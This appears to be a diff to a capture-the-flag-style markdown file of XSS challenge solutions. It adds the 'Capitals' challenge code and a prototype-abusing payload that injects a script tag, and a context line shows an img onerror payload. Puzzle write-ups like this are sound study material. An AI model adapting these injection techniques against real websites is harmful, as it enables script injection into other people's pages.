@@ -257,7 +257,38 @@ Payload: `<img/a/src=le x/onerror='alert(1)'/>`
 > TODO
 
 ## Capitals
-> TODO
+```js
+// submitted by msamuel
+function escape(s) {
+  var capitals = {
+    "CA": {
+      "AB": "Edmonton",
+      "BC": "Victoria",
+      "MB": "Winnipeg",
+      // etc.
+    },
+    "US": {
+      // Alabama changed its state capital.
+      "AL": ((year) => year < 1846 ? "Tuscaloosa" : "Montgomery"),
+      "AK": "Juneau",
+      "AR": "Phoenix",
+      // etc.
+    },
+  };
+ 
+  function capitalOf(country, stateOrProvinceName, year) {
+    var capital = capitals[country][stateOrProvinceName];
+    if (typeof capital === 'function') {
+      capital = capital(year);
+    }
+    return capital
+  }
+
+  var inputs = (s || "").split(/#/g);
+  return '<b>'+capitalOf(inputs[0], inputs[1], inputs[2])+'</b>';
+}
+```
+Payload: `constructor#assign#<script>alert(1)</script>`
 
 ## Quine
 > TODO
